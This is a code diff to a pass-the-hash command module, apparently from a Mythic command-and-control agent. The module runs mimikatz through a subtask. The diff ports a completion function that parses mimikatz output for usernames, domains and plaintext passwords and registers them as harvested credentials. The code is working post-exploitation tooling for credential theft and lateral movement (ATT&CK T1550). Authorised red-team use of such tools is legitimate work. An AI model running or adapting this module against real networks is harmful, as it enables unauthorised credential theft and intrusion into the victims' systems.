@@ -144,6 +144,38 @@ class PthArguments(TaskArguments):
         else:
             raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(PthCommand.help_cmd))
 
+async def parse_credentials(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
+    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
+    responses = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID))
+    for output in responses.Responses:
+        mimikatz_out = output.Response
+        comment = "task {}".format(output.TaskID)
+        if mimikatz_out != "":
+            lines = mimikatz_out.split("\r\n")
+
+            for i in range(len(lines)):
+                line = lines[i]
+                if "Username" in line:
+                    # Check to see if Password is null
+                    if i+2 >= len(lines):
+                        break
+                    uname = line.split(" : ")[1].strip()
+                    realm = lines[i+1].split(" : ")[1].strip()
+                    passwd = lines[i+2].split(" : ")[1].strip()
+                    if passwd != "(null)":
+                        cred_resp = await MythicRPC().execute(
+                            "create_credential",
+                            task_id=task.SubtaskData.Task.ID,
+                            credential_type="plaintext",
+                            account=uname,
+                            realm=realm,
+                            credential=passwd,
+                            comment=comment
+                        )
+                        if cred_resp.status != MythicStatus.Success:
+                            raise Exception("Failed to register credential")
+    return response
+
 
 class PthCommand(CommandBase):
     cmd = "pth"
@@ -158,57 +190,14 @@ class PthCommand(CommandBase):
     argument_class = PthArguments
     attackmapping = ["T1550"]
     script_only = True
+    completion_functions = {"parse_credentials": parse_credentials}
 
-    async def parse_credentials(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
-    #     get_responses(task_id: int) -> dict
-    # For a given Task, get all of the user_output, artifacts, files, and credentials that task as created within Mythic
-    # :param task_id: The TaskID you're interested in (i.e. task.id)
-    # :return: A dictionary of the following format:
-    # {
-    #   "user_output": array of dictionaries where each dictionary is user_output message for the task,
-    #   "artifacts": array of dictionaries where each dictionary is an artifact created for the task,
-    #   "files": array of dictionaries where each dictionary is a file registered as part of the task,
-    #   "credentials": array of dictionaries where each dictionary is a credential created as part of the task.
-    # }
-        response = await MythicRPC().execute("get_responses", task_id=subtask["id"])
-        
-        for output in response.response["user_output"]:
-            
-            mimikatz_out = output.get("response", "")
-            comment = "{} from task {} on callback {}".format(
-                        output["task"].get("original_params"),
-                        output["task"].get("id"),
-                        output["task"].get("callback"))
-            if mimikatz_out != "":
-                lines = mimikatz_out.split("\r\n")
-                
-                for i in range(len(lines)):
-                    line = lines[i]
-                    if "Username" in line:
-                        # Check to see if Password is null
-                        if i+2 >= len(lines):
-                            break
-                        uname = line.split(" : ")[1].strip()
-                        realm = lines[i+1].split(" : ")[1].strip()
-                        passwd = lines[i+2].split(" : ")[1].strip()
-                        if passwd != "(null)":
-                            cred_resp = await MythicRPC().execute(
-                                "create_credential",
-                                task_id=output["task"].get("id"),
-                                credential_type="plaintext",
-                                account=uname,
-                                realm=realm,
-                                credential=passwd,
-                                comment=comment
-                            )
-                            if cred_resp.status != MythicStatus.Success:
-                                raise Exception("Failed to register credential")
-        return task
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         response = await MythicRPC().execute("create_subtask", parent_task_id=task.id,
                         command="execute_pe", params_string=task.args.get_arg("command"), subtask_callback_function="parse_credentials")
         return task
 
-    async def process_response(self, response: AgentResponse):
-        pass
+    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
+        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+        return resp
